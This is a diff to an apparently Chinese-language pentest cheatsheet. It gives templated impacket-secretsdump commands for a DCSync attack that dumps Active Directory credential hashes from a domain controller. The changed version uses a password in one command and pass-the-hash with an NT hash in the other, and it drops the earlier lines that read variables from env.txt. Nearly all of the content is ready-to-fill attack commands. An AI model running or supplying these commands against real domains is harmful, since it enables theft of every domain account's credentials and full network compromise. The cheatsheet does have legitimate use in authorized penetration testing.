@@ -1,11 +1,11 @@
-% DCSync, impacket, secretsdump
+% DCSync, 账号密码, impacket, secretsdump
+@ cred
 
-# 使用账号密码进行DCSync攻击, 在 env.txt 中写入括号中的变量
+# 使用账号密码进行DCSync攻击
 impacket-secretsdump -outputfile 'dcsync' -dc-ip "<DC_IP>" "<DOMAIN>"/"<USER>":"<PASSWORD>"@"<DC_HOST>"
 
-$ DC_IP:    cat env.txt | grep DC_IP    | awk '{print $NF}'
-$ DOMAIN:   cat env.txt | grep DOMAIN   | awk '{print $NF}'
-$ USER:     cat env.txt | grep USER     | awk '{print $NF}'
-$ PASSWORD: cat env.txt | grep PASSWORD | awk '{print $NF}'
-$ DC_HOST:  cat env.txt | grep DC_HOST  | awk '{print $NF}'
+% DCSync, 哈希, impacket, secretsdump
+@ cred
 
+# 使用NTLM hash进行DCSync攻击
+impacket-secretsdump -outputfile 'dcsync' -hashes :"<NT_HASH>" -dc-ip "<DC_IP>" "<DOMAIN>"/"<USER>"@"<DC_HOST>"
